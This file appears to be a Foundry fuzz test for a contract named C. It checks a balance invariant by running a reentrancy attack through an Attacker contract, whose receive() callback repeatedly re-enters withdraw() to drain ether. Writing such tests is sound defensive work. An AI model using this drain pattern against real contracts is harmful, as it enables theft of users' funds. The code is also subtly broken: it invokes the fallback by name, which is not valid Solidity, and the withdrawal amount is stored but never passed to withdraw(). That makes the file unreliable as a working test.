pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(); }

    function testFuzz_property(uint256 depositAmount, uint256 withdrawAmount) public {
        // Bound amounts to avoid overflow and ensure they are in a wide admissible domain
        vm.assume(depositAmount > 0 && depositAmount < type(uint256).max / 2);
        vm.assume(withdrawAmount > 0 && withdrawAmount <= depositAmount);

        // Deploy the reentrant attacker
        Attacker attacker = new Attacker(address(c));
        address attackerAddr = address(attacker);

        // Fund attacker and deposit into C
        vm.deal(attackerAddr, depositAmount);
        vm.prank(attackerAddr);
        c.fallback{value: depositAmount}();

        // Attacker initiates withdraw, triggering reentrancy
        vm.prank(attackerAddr);
        attacker.attack(withdrawAmount);

        // Compute total balances of all known participants by reading public mapping
        uint256 attackerBalance = c.balances(attackerAddr);
        uint256 totalBalances = attackerBalance; // The only participant with a balance here is the attacker

        // Assert: total balances must equal the contract's ether balance
        assertTrue(totalBalances == address(c).balance);
    }
}

contract Attacker {
    C target;
    uint256 amountToWithdraw;
    bool attacking;

    constructor(address _target) {
        target = C(_target);
    }

    function attack(uint256 _amount) external payable {
        amountToWithdraw = _amount;
        attacking = true;
        target.withdraw();
        attacking = false;
    }

    receive() external payable {
        if (attacking && address(target).balance >= amountToWithdraw) {
            // Re-enter withdraw only if there are enough funds to drain
            target.withdraw();
        }
    }
}

